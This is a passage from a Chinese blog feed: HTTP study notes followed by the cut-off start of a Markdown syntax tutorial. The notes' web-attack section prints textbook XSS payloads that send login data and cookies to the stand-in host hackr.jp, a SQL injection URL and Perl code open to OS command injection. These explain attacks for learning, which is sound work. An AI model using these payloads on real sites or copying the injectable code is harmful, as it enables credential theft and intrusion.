    <updated>2019-01-28T14:59:25.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h2><h3 id="重要思想-分层"><a href="#重要思想-分层" class="headerlink" title="重要思想:分层"></a>重要思想:<code>分层</code></h3><h3 id="分层："><a href="#分层：" class="headerlink" title="分层："></a>分层：</h3><ul><li>应用层：<blockquote><p>HTTP协议：生成针对目标web服务器的HTTP请求报文。<br>FTP协议：文件传输协议。<br>DNS协议： 域名解析协议。</p></blockquote></li></ul><a id="more"></a><ul><li>传输层：<blockquote><p>UDP协议：用户数据报协议。<br>TCP协议：传输控制协议：利用三次握手策略。<br><img src="../assets/http/tcp3handmake.gif" alt="Alt text"></p></blockquote></li></ul><ul><li><p>网络层:</p><blockquote><p>IP协议：把各种数据包传送给对方。<br>ARP协议：解析地址协议，通过IP地址查出对应MAC地址。</p></blockquote></li><li><p>链路层：用于处理网络的硬件部分。</p></li></ul><h2 id="URI-URL"><a href="#URI-URL" class="headerlink" title="URI/URL"></a>URI/URL</h2><ul><li>URI：用字符串标识某一互联网资源。</li><li>URL： 互联网上所处的位置表示资源地点。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://user:pass@wwww.example.com:80/dir/index.html?uid=1#ch1</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th style="text-align:center">组成</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">https</td><td style="text-align:center">协议方案</td></tr><tr><td style="text-align:center">user:pass</td><td style="text-align:center">登录信息</td></tr><tr><td style="text-align:center">wwww.example.com</td><td style="text-align:center">服务器地址</td></tr><tr><td style="text-align:center">:80</td><td style="text-align:center">端口号</td></tr><tr><td style="text-align:center">dir/index.html</td><td style="text-align:center">文件路径</td></tr><tr><td style="text-align:center">uid=1</td><td style="text-align:center">查询字符串</td></tr><tr><td style="text-align:center">#ch1</td><td style="text-align:center">片段标识符</td></tr></tbody></table><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="请求响应："><a href="#请求响应：" class="headerlink" title="请求响应："></a>请求响应：</h3><ul><li><p>请求报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST    /from/entry   HTTP/1.1</span><br><span class="line">Host: hacker.jp</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br><span class="line">name: ueno&amp;age=37</span><br></pre></td></tr></table></figure></li><li><p>响应报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1  200  OK</span><br><span class="line">Date: Tue, 10 Jul 2012 06:50:15 GMT</span><br><span class="line">Content-Length: 362</span><br><span class="line">Content-Type: text/html</span><br><span class="line">&lt;html&gt; ......</span><br></pre></td></tr></table></figure></li></ul><h3 id="HTTP可使用方法："><a href="#HTTP可使用方法：" class="headerlink" title="HTTP可使用方法："></a>HTTP可使用方法：</h3><ul><li>GET：获取资源，目的是获取响应的主体内容。</li><li>POST：传输实体主体。</li><li>PUT：传输文件，要求在请求报文中包含文件内容，保存到请求URI指定位置。</li><li>HEAD：获取报文首部，用于确认URI有效性及资源更新的日期时间。</li><li>DELETE：删除文件，删除URI指定资源。</li><li>OPTIONS：询问支持的方法，查询针对请求URI指定资源支持的方法。</li><li>TRACE：追踪路径，用来确认连接过程中发生的一系列操作。</li><li>CONNECT：要求用隧道协议连接代理。</li></ul><h3 id="状态码："><a href="#状态码：" class="headerlink" title="状态码："></a>状态码：</h3><ul><li>状态码类别：</li></ul><table><thead><tr><th style="text-align:center">状态码</th><th style="text-align:center">分类</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">1xx</td><td style="text-align:center">Infromational(信息性状态码)</td><td style="text-align:center">接收的请求正在处理</td></tr><tr><td style="text-align:center">2xx</td><td style="text-align:center">Success(成功状态码)</td><td style="text-align:center">请求正常处理完成</td></tr><tr><td style="text-align:center">3xx</td><td style="text-align:center">Redirectiion(重定向状态码)</td><td style="text-align:center">需要进行附加操作以完成请求</td></tr><tr><td style="text-align:center">4xx</td><td style="text-align:center">Client Error(客户端错误状态码)</td><td style="text-align:center">服务器无法处理请求</td></tr><tr><td style="text-align:center">5xx</td><td style="text-align:center">Server Error(服务器错误状态码)</td><td style="text-align:center">服务器处理请求出错</td></tr></tbody></table><ul><li>常用状态码：</li></ul><table><thead><tr><th style="text-align:left">状态码</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">200 OK</td><td style="text-align:left">从客户端发来的请求在服务端被正常处理了</td></tr><tr><td style="text-align:left">204 No Content</td><td style="text-align:left">服务器接受的请求已成功处理，但返回的响应报文不含实体主体</td></tr><tr><td style="text-align:left">206 Partial Content</td><td style="text-align:left">客户端进行了范围请求</td></tr><tr><td style="text-align:left">301 Moved Permanently</td><td style="text-align:left">永久性重定向</td></tr><tr><td style="text-align:left">302 Found</td><td style="text-align:left">临时性重定向，请求的资源已被分配了新的URI</td></tr><tr><td style="text-align:left">303 See Other</td><td style="text-align:left">与302有着相同功能，但明确要求采用GET获取资源</td></tr><tr><td style="text-align:left">304 Not Modified</td><td style="text-align:left">客户端发送附带条件请求时，服务端允许请求访问，但未满足条件</td></tr><tr><td style="text-align:left">307 Temporary Redirect</td><td style="text-align:left">与302有相同含义，但不会使POST变成GET</td></tr><tr><td style="text-align:left">400 Bad Request</td><td style="text-align:left">请求报文种存在语法错误</td></tr><tr><td style="text-align:left">401 Unauthorized</td><td style="text-align:left">需通过HTTP认证，若已进行过一次请求，则表示认证失败</td></tr><tr><td style="text-align:left">403 Forbidden</td><td style="text-align:left">请求资源的访问被服务器拒绝</td></tr><tr><td style="text-align:left">404 Not Found</td><td style="text-align:left">服务器上无法找到请求的资源</td></tr><tr><td style="text-align:left">500 Internal Server Error</td><td style="text-align:left">服务器端在执行请求时发生了错误</td></tr><tr><td style="text-align:left">503 Service Unavailable</td><td style="text-align:left">服务器暂处于超负载或正在进行停机维护，无法处理请求</td></tr></tbody></table><h3 id="通信数据转发程序："><a href="#通信数据转发程序：" class="headerlink" title="通信数据转发程序："></a>通信数据转发程序：</h3><h4 id="代理："><a href="#代理：" class="headerlink" title="代理："></a>代理：</h4><ul><li>作用：接收由客户端发送的请求并转发给服务器，接收服务器相应转发给客户端，转发时，需要附加Via首部字段以标记出经过的主机信息。</li><li>使用理由：<blockquote><p>利用缓存技术减少网络带宽的流量<br>组织内部针对特定网站的访问控制<br>以获取访问日志为主要目的</p></blockquote></li><li>分类：<blockquote><p>缓存代理：会预先将资源的副本保存在代理服务器<br>透明代理：不对报文做任何加工的代理类型为透明代理</p></blockquote></li></ul><h4 id="网关："><a href="#网关：" class="headerlink" title="网关："></a>网关：</h4><ul><li>作用：工作机制和代理十分相似，而网关能使通信线路上的服务器提供非HTTP协议。</li></ul><h4 id="隧道："><a href="#隧道：" class="headerlink" title="隧道："></a>隧道：</h4><ul><li>作用：建立一条与其他服务器通信的线路，确保客户端能与服务器进行安全的通信。</li></ul><h3 id="HTTP首部字段："><a href="#HTTP首部字段：" class="headerlink" title="HTTP首部字段："></a>HTTP首部字段：</h3><h4 id="类型："><a href="#类型：" class="headerlink" title="类型："></a>类型：</h4><ul><li>通用首部字段：请求报文和响应报文两方都会使用的首部</li><li>请求首部字段：请求报文使用的首部</li><li>响应首部字段：响应报文使用的首部</li><li>实体首部字段：补充了资源内容更新时间等实体有关的信息</li></ul><h4 id="End-to-end首部和Hop-to-hop首部："><a href="#End-to-end首部和Hop-to-hop首部：" class="headerlink" title="End-to-end首部和Hop-to-hop首部："></a>End-to-end首部和Hop-to-hop首部：</h4><ul><li>端到端首部(End-to-end)：分在此类的首部会转发给请求/想一个的最终接受目标。</li><li>逐跳首部(Hop-to-hop)：分在此类的首部支队单词转发有效，会因通过缓存代理不转发。</li></ul><h4 id="通用首部字段："><a href="#通用首部字段：" class="headerlink" title="通用首部字段："></a>通用首部字段：</h4><ul><li>Cache-Control：操作缓存的工作机制</li><li>Connection：控制不再转发给代理的首部字段，管理持久连接</li><li>Date：表明创建HTTP报文的日期和时间</li><li>Pragma：要求所有的中间服务器不返回缓存的资源</li><li>Trailer：事先说明在报文主体后记录了哪些首部字段，可应用于分块传输编码</li><li>Upgrade：用于检测HTTP协议及其协议是否可使用更高的版本进行通信</li><li>Via：追踪客户端与服务器之间的请求和响应报文的传输路径</li><li>Warning:HTTP/1.0：响应首部演变过来，通常会告知用户一些与缓存相关的问题的警告</li></ul><h4 id="请求首部字段："><a href="#请求首部字段：" class="headerlink" title="请求首部字段："></a>请求首部字段：</h4><ul><li>Accept：通知服务器用户代理可处理的媒体类型及媒体类型的相对优先级顺序</li><li>Accept-Charset：通知服务器用户代理支持的字符集及字腹肌的相对优先级顺序</li><li>Accept-Encoding：通知服务器用户代理支持的内容编码及内容编码的相对优先级顺序</li><li>Accept-Language：通知服务器用户代理支持的自然语言集及其相对优先级顺序</li><li>Authorization：通知服务器用户代理的认证信息</li><li>Expect：期望出现某种特定行为，服务器无法理解作出回应时，返回417 Expectation Failed</li><li>From：使用用户代理的用户的电子邮件地址</li><li>Host：请求资源所处的互联网主机名和端口号</li><li>If-Match：匹配资源所用的实体标记值</li><li>If-Modified-Since：请求指定日期后更新过的资源</li><li>If-None-Match：当实体标记(Etag)与请求资源的Etag不一致时，处理请求</li><li>If-range：If-range字段值若是和Etag值的更新日期时间一致，则做范围请求处理</li><li>If-Unmodified-Since：请求在指定日期后未发生更新的资源</li><li>Max-Forwards：指定可经过的服务器最大数目</li><li>Proxy-Authorization：通知服务器认证所需要的信息</li><li>Range：通知服务器资源的指定范围</li><li>Referer：通知服务器请求的原始资源的URI</li><li>TE：通知服务器客户端能够处理响应的传输编码方式及其相对优先级顺序</li><li>User-Agent：将创建请求的浏览器和用户代理名称等信息传输给服务器</li></ul><h4 id="响应首部字段："><a href="#响应首部字段：" class="headerlink" title="响应首部字段："></a>响应首部字段：</h4><ul><li>Accept-Ranges：用来告知客户端服务器是否能处理范围请求</li><li>Age：告知客户端源服务器在多久前创建了响应，单位为妙</li><li>Etag：告知客户端实体标记，可将资源以字符串形式做唯一性标识的方式</li><li>Location：将响应接收方引导至某个与请求URI位置不同的资源</li><li>Proxy-Authenticate：把由代理服务器所要求的的认证信息发送给客户端</li><li>Retry-After：告知客户端在多久之后再次发送请求</li><li>Server：告知客户端当前服务器上安装的HTTP服务器应用程序的信息</li><li>Vary：可对缓存进行控制</li><li>www-Authenticate：告知客户端适用于访问请求URI所指定资源的认证方案</li></ul><h4 id="实体首部字段："><a href="#实体首部字段：" class="headerlink" title="实体首部字段："></a>实体首部字段：</h4><ul><li>Allow：通知客户端能够支持Request-URI制定资源的所有HTTP方法</li><li>Content-Encoding：告知客户端服务器对实体的主体部分选用的内容编码方式</li><li>Content-Language：告知客户端实体主体使用的自然语言</li><li>Content-Length：表明了实体主体部分的大小</li><li>Content-Location：与报文主体部分相对应的URI</li><li>Content-MD5：检查报文主体在传输过程中是否保持完整，以及确认传输到达</li><li>Content-Range：告知客户端作为响应返回的实体的哪个部分符合范围请求</li><li>Content-Type：说明了实体主体内对象的媒体类型</li><li>Expires：将资源失效的日期告知客户端</li><li>Last-Modified：指明资源最终修改的时间</li></ul><h4 id="为Cookie服务的首部字段："><a href="#为Cookie服务的首部字段：" class="headerlink" title="为Cookie服务的首部字段："></a>为Cookie服务的首部字段：</h4><ul><li><p>Set-Cookie：</p><blockquote><p>expires属性：指定浏览器可发送Cookie的有效期<br>path属性：限制指定Cookie的发送范围的文件目录<br>domain属性：作为Cookie适用对象的域名<br>secure属性：仅在HTTPS安全通信时才会发送Cookie<br>HttpOnly属性：加以限制，使Cookie不能被JavaScript脚本访问</p></blockquote></li><li><p>Cookie：当客户想获得HTTP状态管理支持时，就会在请求中包含从服务器接受的Cookie</p></li></ul><h4 id="其他首部字段："><a href="#其他首部字段：" class="headerlink" title="其他首部字段："></a>其他首部字段：</h4><ul><li>X-Frame-Options：用于控制网站内容在其他Web网站的Frame标签内的现实问题，防止点击劫持攻击</li><li>X-XSS-Protection：针对跨站脚本攻击(XSS)的一种对策，用于控制浏览器XSS防护机制的开关</li><li>DNT：意为拒绝个人信息被收集，表示拒绝被精准广告追踪的一种方法</li><li>P3P：利用P3P技术让Web网站上的个人隐私变成一种仅供程序可理解的形式</li></ul><h2 id="HTTP和HTTPS"><a href="#HTTP和HTTPS" class="headerlink" title="HTTP和HTTPS"></a>HTTP和HTTPS</h2><h3 id="HTTP的缺点："><a href="#HTTP的缺点：" class="headerlink" title="HTTP的缺点："></a>HTTP的缺点：</h3><ul><li>通信使用明文(不加密)，内容可能会被窃听</li><li>不验证通信方的身份，因此有可能遭遇伪装</li><li>无法证明报文的完整性，所以有可能已遭篡改</li></ul><h3 id="HTTPS："><a href="#HTTPS：" class="headerlink" title="HTTPS："></a>HTTPS：</h3><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><ul><li>HTTPS实在HTTP通信接口部分用SSL和TLS协议代替</li><li>添加了加密及认证机制的HTTP成为HTTPS</li></ul><h4 id="安全通信机制："><a href="#安全通信机制：" class="headerlink" title="安全通信机制："></a>安全通信机制：</h4><p><img src="../assets/http/httpsProcess.jpg" alt="Alt text"></p><h3 id="HTTP认证："><a href="#HTTP认证：" class="headerlink" title="HTTP认证："></a>HTTP认证：</h3><ul><li>Basic认证：采用Base64编码，发送明文密码</li><li>Digest认证：使用质询/响应方式</li><li>SSL客户端认证：借由HTTPS的客户端证书完成认证</li><li>基于表单认证：最常用，并用Cookie来管理Session会话</li></ul><h2 id="基于HTTP的功能追加协议"><a href="#基于HTTP的功能追加协议" class="headerlink" title="基于HTTP的功能追加协议"></a>基于HTTP的功能追加协议</h2><h3 id="SPDY"><a href="#SPDY" class="headerlink" title="SPDY"></a>SPDY</h3><h4 id="HTTP的瓶颈："><a href="#HTTP的瓶颈：" class="headerlink" title="HTTP的瓶颈："></a>HTTP的瓶颈：</h4><ul><li>一条连接上只可发送一个请求</li><li>请求只能从客户端开始，客户端不可以接收响应以外的指令</li><li>请求/响应首部未经压缩就发送，首部信息越多延迟越大</li><li>发送冗长的首部，每次互相发送相同的首部造成的浪费较多</li><li>可任意选择数据压缩格式，非强制压缩发送</li></ul><h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><ul><li>Ajax：异步请求实现局部刷新，但可能存在大量请求产生</li><li>Comet：一旦服务器内容更新了，可以立即反馈给客户端</li><li>SPDY：<blockquote><p>以会话层的形式加入，控制对数据的流动，但还是采用HTTP建立通信连接<br><code>HTTP</code> 应用层<br><code>SPDY</code> 会话层<br><code>SSL</code> 表示层<br><code>TCP</code> 传输层<br>多路复用流：通过单一的TCP连接，可以无限制处理多个HTTP请求<br>赋予请求优先级：可以给请求逐个分配优先级顺序<br>压缩HTTP首部：压缩HTTP请求和响应的首部<br>推送功能：支持服务器主动向客户端推送数据的功能<br>服务器提示功能：服务器可以主动提示客户端请求所需的资料</p></blockquote></li></ul><h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义:"></a>定义:</h4><ul><li>即Web浏览器与Web浏览器服务器之间全双工通信标准</li></ul><h4 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h4><ul><li>推送功能：支持由服务器向客户端推送数据的推送功能</li><li>减少通行量：只要建立起WebSocket连接，就希望一直保持连接状态</li></ul><h4 id="WebSocketAPI"><a href="#WebSocketAPI" class="headerlink" title="WebSocketAPI:"></a>WebSocketAPI:</h4><ul><li>JavaScript可调用API，实现WebSocket协议下全双工通信</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var socket = new WebSocket(&apos;ws://game.example.com:12010/updates&apos;);</span><br><span class="line">socket.onopen = function()&#123;</span><br><span class="line">    setInternal(function()&#123;</span><br><span class="line">        if(socket.bufferedAmout == 0)&#123;</span><br><span class="line">            socket.send(getUpdateData());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,50);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="WebDAV"><a href="#WebDAV" class="headerlink" title="WebDAV"></a>WebDAV</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义:"></a>定义:</h4><ul><li>WebDAV是一个可对Web服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统</li></ul><h4 id="引入概念"><a href="#引入概念" class="headerlink" title="引入概念:"></a>引入概念:</h4><ul><li>集合(Collection)：是一种统一管理多个资源的概念，以集合为单位可进行各种操作</li><li>资源(Resource)：把文件或集合称为资源</li><li>属性(Property)：定义资源的属性</li><li>锁(Lock)：把文件设置成无法编辑状态</li></ul><h4 id="新增方法及状态码"><a href="#新增方法及状态码" class="headerlink" title="新增方法及状态码:"></a>新增方法及状态码:</h4><ul><li>PROPFIND：获取属性</li><li>PROPPATCH：修改属性</li><li>MKCOL：创建集合</li><li>COPY：复制资源及属性</li><li>MOVE：移动资源</li><li>LOCK：资源加锁</li><li>UNLOCK：资源解锁</li></ul><table><thead><tr><th style="text-align:left">状态码</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">102 Processing</td><td style="text-align:left">可正常处理请求，但目前是处理中状态</td></tr><tr><td style="text-align:left">207 Multi-Status</td><td style="text-align:left">存在多种状态</td></tr><tr><td style="text-align:left">422 Unprocessible Entity</td><td style="text-align:left">格式正确，内容有误</td></tr><tr><td style="text-align:left">423 Locked</td><td style="text-align:left">资源已被加锁</td></tr><tr><td style="text-align:left">424 Failed Dependency</td><td style="text-align:left">处理与某请求关联的请求失败，因此不再维持依赖关系</td></tr><tr><td style="text-align:left">507 Insufficient Storage</td><td style="text-align:left">保存空间不足</td></tr></tbody></table><h2 id="Web的攻击技术"><a href="#Web的攻击技术" class="headerlink" title="Web的攻击技术"></a>Web的攻击技术</h2><h3 id="跨站脚本攻击-XSS"><a href="#跨站脚本攻击-XSS" class="headerlink" title="跨站脚本攻击(XSS)"></a>跨站脚本攻击(XSS)</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击</li></ul><h4 id="造成影响"><a href="#造成影响" class="headerlink" title="造成影响:"></a>造成影响:</h4><ul><li>利用虚假输入表单骗取用户个人信息</li><li>利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求</li><li>显示伪造的文章或图片</li></ul><h4 id="攻击案例"><a href="#攻击案例" class="headerlink" title="攻击案例:"></a>攻击案例:</h4><ul><li>获取用户登录信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.jp/Login?ID=&quot;&gt;&lt;script&gt;var tf=document.getElemenById(&apos;login&apos;);tf.action=&apos;http://hackr.jp/pwget&apos;;tf.method=&apos;get&apos;;&lt;/script&gt;&lt;span ts=&quot;</span><br></pre></td></tr></table></figure><ul><li>对用户Cookie的窃取攻击</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.jp/login?ID=&quot;&gt;&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;&quot;</span><br><span class="line">xss.js文件：</span><br><span class="line">var content = escape(document.cookie);</span><br><span class="line">document.write(&quot;&lt;img src=http://hackr.jp/?&quot;);</span><br><span class="line">document.write(content);</span><br><span class="line">document.write(&quot;&gt;&quot;);</span><br></pre></td></tr></table></figure><h3 id="SQL攻击"><a href="#SQL攻击" class="headerlink" title="SQL攻击"></a>SQL攻击</h3><h4 id="定义-3"><a href="#定义-3" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指针对Web应用使用的数据库通过运行非法的SQL而产生的攻击</li></ul><h4 id="造成影响-1"><a href="#造成影响-1" class="headerlink" title="造成影响:"></a>造成影响:</h4><ul><li>非法查看或篡改数据库内的数据</li><li>规避认证</li><li>执行和数据库服务器业务关联的程序等</li></ul><h4 id="攻击案例-1"><a href="#攻击案例-1" class="headerlink" title="攻击案例:"></a>攻击案例:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/search?q=marry&apos;--</span><br><span class="line">select * from bookTbl where author=&quot;marry&quot; --&apos; and flag=1;</span><br></pre></td></tr></table></figure><h3 id="OS命令注入攻击"><a href="#OS命令注入攻击" class="headerlink" title="OS命令注入攻击"></a>OS命令注入攻击</h3><h4 id="定义-4"><a href="#定义-4" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指通过Web应用，执行非法的操作系统命令达到攻击的目的</li></ul><h4 id="攻击案例-2"><a href="#攻击案例-2" class="headerlink" title="攻击案例:"></a>攻击案例:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $adr = $q -&gt; param(&apos;mailaddress&apos;);</span><br><span class="line">open(MAIL,&quot;|/user/sbin/senmail  $adr&quot;);</span><br><span class="line">print MAIL &quot;Form:info@example.com\n&quot;;</span><br></pre></td></tr></table></figure><h3 id="HTTP首部注入攻击"><a href="#HTTP首部注入攻击" class="headerlink" title="HTTP首部注入攻击"></a>HTTP首部注入攻击</h3><h4 id="定义-5"><a href="#定义-5" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击</li></ul><h3 id="邮件首部注入攻击"><a href="#邮件首部注入攻击" class="headerlink" title="邮件首部注入攻击"></a>邮件首部注入攻击</h3><h4 id="定义-6"><a href="#定义-6" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指Web应用中的邮件发送功能，攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击</li></ul><h3 id="目标遍历攻击"><a href="#目标遍历攻击" class="headerlink" title="目标遍历攻击"></a>目标遍历攻击</h3><h4 id="定义-7"><a href="#定义-7" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击</li></ul><h3 id="跨站点请求伪造-CSRF"><a href="#跨站点请求伪造-CSRF" class="headerlink" title="跨站点请求伪造(CSRF)"></a>跨站点请求伪造(CSRF)</h3><h4 id="定义-8"><a href="#定义-8" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新</li></ul><h3 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h3><h4 id="定义-9"><a href="#定义-9" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指利用透明的按钮或链接做成陷阱覆盖在Web页面之上</li></ul><h3 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h3><h4 id="定义-10"><a href="#定义-10" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是一种让运行中的服务呈停止状态的攻击</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;TCP-IP协议族&quot;&gt;&lt;a href=&quot;#TCP-IP协议族&quot; class=&quot;headerlink&quot; title=&quot;TCP/IP协议族&quot;&gt;&lt;/a&gt;TCP/IP协议族&lt;/h2&gt;&lt;h3 id=&quot;重要思想-分层&quot;&gt;&lt;a href=&quot;#重要思想-分层&quot; class=&quot;headerlink&quot; title=&quot;重要思想:分层&quot;&gt;&lt;/a&gt;重要思想:&lt;code&gt;分层&lt;/code&gt;&lt;/h3&gt;&lt;h3 id=&quot;分层：&quot;&gt;&lt;a href=&quot;#分层：&quot; class=&quot;headerlink&quot; title=&quot;分层：&quot;&gt;&lt;/a&gt;分层：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;应用层：&lt;blockquote&gt;
&lt;p&gt;HTTP协议：生成针对目标web服务器的HTTP请求报文。&lt;br&gt;FTP协议：文件传输协议。&lt;br&gt;DNS协议： 域名解析协议。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="HTTP" scheme="http://dangoying.ink/categories/HTTP/"/>
    
    
      <category term="HTTP" scheme="http://dangoying.ink/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>Markdown常用语法</title>
    <link href="http://dangoying.ink/Markdown%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95.html"/>
    <id>http://dangoying.ink/Markdown常用语法.html</id>
    <published>2018-03-30T15:04:22.000Z</published>
    <updated>2018-04-08T10:48:02.769Z</updated>
    
    <content type="html"><![CDATA[<h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>在Markdown中，标题一共分为六级，只需在文字前加上 <code>#</code> 即可，这类标题也可以选择闭合，闭合只是为了美观，由行首的井字符数量决定标题的阶数。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># h1</span><br><span class="line">## h2</span><br><span class="line">### h3</span><br><span class="line">#### h4</span><br><span class="line">##### h5</span><br><span class="line">###### h6</span><br></pre></td></tr></table></figure><h2 id="分级标题"><a href="#分级标题" class="headerlink" title="分级标题"></a>分级标题</h2><p>与标题作用类似，<code>=</code> 和 <code>-</code> 最少可只写一个，兼容性一般。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一级标题</span><br><span class="line">============</span><br><span class="line">二级标题</span><br><span class="line">------------</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>根据标题生成目录，兼容性一般，nexT主题已经开启自动生成目录。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[TOC]</span><br></pre></td></tr></table></figure><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>引用可以分为单行引用和多行引用（引用块），同时只要根据层次加上 <code>&gt;</code> 就可以实现嵌套引用，引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等。代码：</p><h3 id="单行式"><a href="#单行式" class="headerlink" title="单行式"></a>单行式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br></pre></td></tr></table></figure><p>效果：</p><blockquote><p>hello world!</p></blockquote><h3 id="多行式"><a href="#多行式" class="headerlink" title="多行式"></a>多行式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br><span class="line">brand new world!</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br><span class="line">&gt; brand new world!</span><br></pre></td></tr></table></figure><p>效果相同：</p><blockquote><p>hello world!<br>brand new world!</p></blockquote><h3 id="嵌套式"><a href="#嵌套式" class="headerlink" title="嵌套式"></a>嵌套式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br><span class="line">&gt;&gt; brand new world!</span><br></pre></td></tr></table></figure><p>效果：</p><blockquote><p>hello world!</p><blockquote><p>brand new world!</p></blockquote></blockquote><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>代码块可分为行内代码块和多行代码块。代码：</p><h3 id="行内代码"><a href="#行内代码" class="headerlink" title="行内代码"></a>行内代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;div&gt;&lt;/div&gt;`</span><br></pre></td></tr></table></figure><p>效果：<br><code>&lt;div&gt;&lt;/div&gt;</code></p><h3 id="代码块-1"><a href="#代码块-1" class="headerlink" title="代码块"></a>代码块</h3><p>用三个反引号包裹一串代码，或者使用Tab缩进。注意要空开一行书写。<br>效果：</p><pre><code>&lt;div&gt;       &lt;div&gt;&lt;/div&gt;    &lt;div&gt;&lt;/div&gt;    &lt;div&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><h3 id="自定义语法"><a href="#自定义语法" class="headerlink" title="自定义语法"></a>自定义语法</h3><p>该方法可以根据不同的语言配置不同的代码着色。(代码在使用的时候去掉前面的反斜杠，这里为了防止被编译而加上)</p><figure class="highlight plain"><table><tr><td 